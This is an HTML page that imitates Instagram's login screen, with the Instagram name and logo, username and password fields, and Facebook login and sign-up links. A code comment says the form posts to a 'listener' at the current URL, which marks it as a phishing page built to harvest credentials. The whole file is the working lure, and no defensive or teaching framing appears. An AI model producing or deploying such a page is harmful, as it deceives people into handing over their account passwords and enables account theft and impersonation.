<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login â€¢ Instagram</title>
    <style>
        body {
            background-color: #fafafa;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
        }

        .main-container {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            width: 350px;
            padding: 40px;
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-bottom: 10px;
        }

        .logo {
            margin-bottom: 30px;
            height: 51px;
            width: 175px;
            /* Placeholder for Instagram font logo or image */
            background-image: url('https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1024px-Instagram_logo.svg.png');
            background-size: contain;
            background-repeat: no-repeat;
            background-position: center;
        }

        form {
            width: 100%;
            display: flex;
            flex-direction: column;
        }

        input {
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            padding: 9px 8px 7px;
            margin-bottom: 6px;
            font-size: 14px;
            outline: none;
        }

        input:focus {
            border: 1px solid #a8a8a8;
        }

        button {
            background-color: #0095f6;
            border: 1px solid transparent;
            border-radius: 4px;
            color: #fff;
            font-weight: 600;
            padding: 5px 9px;
            margin-top: 8px;
            cursor: pointer;
            font-size: 14px;
        }

        button:hover {
            background-color: #1877f2;
        }

        .or-divider {
            display: flex;
            flex-direction: row;
            margin: 20px 0;
            width: 100%;
            align-items: center;
        }

        .line {
            height: 1px;
            background-color: #dbdbdb;
            flex: 1;
        }

        .or-text {
            margin: 0 18px;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
        }

        .fb-login {
            color: #385185;
            font-weight: 600;
            font-size: 14px;
            text-decoration: none;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 15px;
        }

        .forgot-password {
            color: #00376b;
            font-size: 12px;
            text-decoration: none;
        }

        .signup-container {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            width: 350px;
            padding: 20px 40px;
            text-align: center;
        }

        .signup-text {
            color: #262626;
            font-size: 14px;
            margin: 0;
        }

        .signup-link {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
        }
    </style>
</head>

<body>
    <div class="main-container">
        <div class="logo"></div>

        <!-- Login Form -->
        <!-- Action is empty to post to the current URL (listener) -->
        <form action="" method="post">
            <input type="text" name="username" placeholder="Phone number, username, or email" required
                aria-label="Phone number, username, or email">
            <input type="password" name="password" placeholder="Password" required aria-label="Password">
            <button type="submit">Log in</button>
        </form>

        <div class="or-divider">
            <div class="line"></div>
            <div class="or-text">OR</div>
            <div class="line"></div>
        </div>

        <a href="#" class="fb-login">Log in with Facebook</a>
        <a href="#" class="forgot-password">Forgot password?</a>
    </div>

    <div class="signup-container">
        <p class="signup-text">Don't have an account? <a href="#" class="signup-link">Sign up</a></p>
    </div>
</body>

</html>
